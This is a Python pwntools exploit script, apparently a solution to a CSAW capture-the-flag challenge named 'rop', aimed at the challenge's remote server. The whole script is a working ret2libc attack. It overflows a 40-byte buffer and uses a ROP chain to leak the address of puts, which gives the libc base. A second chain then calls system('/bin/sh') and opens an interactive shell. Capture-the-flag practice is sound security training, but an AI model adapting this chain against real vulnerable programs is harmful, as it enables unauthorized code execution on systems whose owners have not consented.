#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop")
#libc = ELF("./libc-2.27.so")
libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})


def main():
#    r = conn()
    
    r = remote("pwn.chal.csaw.io", 5016)
    
    PopRdi = 0x0000000000400683
    offset = 40

    payload = b"M"*offset
    payload += p64(PopRdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt["puts"])
    payload += p64(exe.sym['main'])


    r.recvline()
    r.sendline(payload)
#    r.interactive()

    PUTS = u64(r.recvline().strip().ljust(8, b"\x00"))
    log.info("puts @ 0x%x", PUTS)

    libc.address = PUTS - libc.sym['puts']
    log.warn("Libc base @ 0x%x", libc.address)

    payload  = b"M"*offset
    payload += p64(PopRdi)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(0x0000000000400611)
    payload += p64(libc.sym['system'])

    r.recvline()

    pause()
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
